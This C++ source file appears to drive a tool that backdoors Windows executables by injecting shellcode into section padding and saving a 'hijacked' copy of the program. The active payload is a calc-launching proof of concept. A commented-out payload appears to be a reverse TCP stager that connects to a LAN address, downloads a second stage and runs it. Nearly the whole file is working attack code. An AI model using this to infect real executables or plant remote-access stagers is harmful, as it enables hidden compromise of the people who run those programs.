#include "hijacker.h"
#include <stdio.h>
#include <Windows.h>

int main(int argc, char * argv[]) {
	unsigned char buf[] = "\x60\x31\xD2\x52\x68\x63\x61\x6C\x63"
		"\x54\x59\x52\x51\x64\x8B\x72\x30\x8B\x76\x0C\x8B"
		"\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B"
		"\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x54\x1F"
		"\x24\x0F\xB7\x2C\x17\x42\x42\xAD\x81\x3C\x07\x57"
		"\x69\x6E\x45\x75\xF0\x8B\x74\x1F\x1C\x01\xFE\x03"
		"\x3C\xAE\xFF\xD7\x58\x58\x61";
	/*
	unsigned char buf[] =
		"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
		"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
		"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
		"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
		"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
		"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
		"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
		"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
		"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
		"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
		"\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54"
		"\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x64\x84"
		"\x68\x02\x00\xc3\x50\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
		"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
		"\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67"
		"\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
		"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00"
		"\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56"
		"\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58"
		"\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5"
		"\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85"
		"\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1"
		"\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
	*/

	PEHijacker * hj = new PEHijacker();
	const char * pePath = "C:\\PE\\HelloWorld.exe";
	const char * newPePath = "C:\\PE\\HelloWorldHijacked.exe";
	hj->loadPE((char*)pePath);
	hj->setShellcode(buf, sizeof(buf));
	hj->hijack();
	hj->savePE((char*)newPePath);
	printf("[-] Loaded PE file\n");
	printf("[-] .text section has %d bytes of padding for use\n", hj->getPaddingSize(hj->getSectionHeader((char*)".text")));
	system("pause");
	return 1;
}